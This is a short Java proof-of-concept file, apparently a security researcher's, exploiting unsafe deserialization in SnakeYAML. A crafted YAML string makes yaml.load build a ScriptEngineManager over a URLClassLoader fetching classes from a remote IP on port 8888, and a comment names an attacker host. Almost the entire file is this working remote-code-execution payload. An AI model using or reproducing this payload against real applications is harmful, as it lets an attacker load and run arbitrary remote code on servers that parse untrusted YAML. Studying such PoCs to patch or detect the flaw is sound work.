import org.yaml.snakeyaml.Yaml;
import java.net.MalformedURLException;

public class YamlPoc {

    public static void main(String[] argv) throws MalformedURLException {
        // 找到new函数时就会执行的类即可。
        String malicious = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
                + "[[!!java.net.URL [\"http://47.101.152.200:8888\"]]]]";
        String test ="!!";
        Yaml yaml = new Yaml();
        Object obj = yaml.load(malicious); // Make request to http://attacker.com

    }
}